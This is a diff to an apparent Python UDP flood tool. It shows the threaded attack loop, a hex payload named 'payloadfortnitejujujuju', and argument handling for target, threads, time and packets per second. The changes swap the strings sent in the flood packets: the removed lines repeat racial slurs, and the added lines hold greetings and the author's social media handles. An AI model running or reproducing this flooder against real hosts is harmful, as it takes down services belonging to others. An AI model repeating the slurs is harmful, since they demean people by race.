@@ -1688,12 +1688,12 @@ def attack_fortigayserver(host, port, timer, pps, payload):
             s.sendto(payload, (str(host), int(port)))
             s.sendto(payload, (str(host), int(port)))
             s.sendto(payload, (str(host), int(port)))
-        s.sendto(b"Nigger uwuwuwuwuwu", (str(host), int(port)))
-        s.sendto(b"fortgaynigger nigger nigger nigger sussy sussy attack by amongus creators", (str(host), int(port)))
-        s.sendto(b"fortgaynigger nigger nigger nigger sussy sussy attack by amongus creators", (str(host), int(port)))
-        s.sendto(b"fortgaynigger nigger nigger nigger sussy sussy attack by amongus creators", (str(host), int(port)))
-        s.sendto(b"ATTACK BY AMONGUS SUSSY CREATORS", (str(host), int(port)))
-        s.sendto(b"ATTACK BY AMONGUS GAME", (str(host), int(port)))
+        s.sendto(b"Hello Friend", (str(host), int(port)))
+        s.sendto(b"Hello Friend", (str(host), int(port)))
+        s.sendto(b"Thank u for use it", (str(host), int(port)))
+        s.sendto(b"MY Insta : https://instagram.com/is.not_walid", (str(host), int(port)))
+        s.sendto(b"My github page : https://github.com/black-hat-rgb", (str(host), int(port)))
+        s.sendto(b"By Friend", (str(host), int(port)))
 
 payloadfortnitejujujuju = b"\x00\x02\xf1\x26\x01\x26\xf0\x90\xa6\xf0\x26\x57\x4e\xac\xa0\xec\xf8\x68\xe4\x8d\x21" # MAGIAAAAAAAAAAAA
 
@@ -1704,16 +1704,16 @@ try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         for i in range(5):
-            s.sendto(b"SuSsy UWUWUWUWUWU NIGGER NIGGER UWUWUWUWUWUUWUWUWUUWUWUW", (str('127.0.0.1'), int(port))) # 
+            s.sendto(b"Suiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii", (str('127.0.0.1'), int(port))) # 
     except:
         pass
     threads = sys.argv[3]
     times = sys.argv[4]
     pps = sys.argv[5]
-    print('Attack by sussy amogus')
-    print('DU YU LAIK DIK?')
+    print('Hello Friend')
+    print('Hello Friend')
     for i in range(int(threads)):
-        print(f'Thread [{i}] Started SuSSy AmoGuS SuSSy NiGg4')
+        print(f'Thread [{i}] STarted')
         threading.Thread(target=attack_fortigayserver, args=(ip, port, times, pps, payloadfortnitejujujuju)).start()
 except IndexError:
     print('Black Hat Rgb')
